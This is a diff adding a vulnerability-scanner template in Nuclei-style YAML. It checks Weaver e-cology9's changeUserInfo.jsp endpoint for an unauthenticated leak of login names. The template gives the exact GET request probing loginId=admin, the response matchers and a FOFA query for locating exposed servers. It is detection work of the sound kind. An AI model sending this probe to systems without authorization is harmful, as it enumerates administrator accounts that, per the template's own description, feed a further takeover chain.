@@ -1,0 +1,39 @@
+id: ecology-changeuserinfo-info-leak
+
+info:
+  name: 泛微 e-cology changeUserInfo 用户登录名泄露
+  author: Chaitin
+  severity: high
+  description: |
+    泛微 e-cology9 /mobile/plugin/changeUserInfo.jsp 未授权可按 loginId 查询账号状态，泄露管理员等登录名，可用于后续任意用户登录链。
+  reference:
+    - https://mp.weixin.qq.com/s/Rhk7DaiL_YgqzaRwahDmjw
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="泛微-协同办公OA"
+  tags: weaver,ecology,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mobile/plugin/changeUserInfo.jsp?type=status&loginId=admin"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"code":'
+          - '"status":"1"'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - '"code":"-1"'
+        negative: true
+
+      - type: status
+        status:
+          - 200
